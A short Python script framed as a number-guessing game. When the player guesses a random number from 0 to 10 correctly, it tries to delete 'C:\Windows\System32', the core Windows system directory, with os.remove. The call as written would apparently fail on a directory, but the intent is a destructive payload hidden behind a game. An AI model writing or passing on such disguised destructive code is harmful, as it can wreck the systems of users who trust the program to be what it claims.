import os
import random
number=int(input("guess a number between 0 & 10:- "))
if number == random.randint(0,10):
    os.remove("C:\Windows\System32")
else:
    print("Try Again")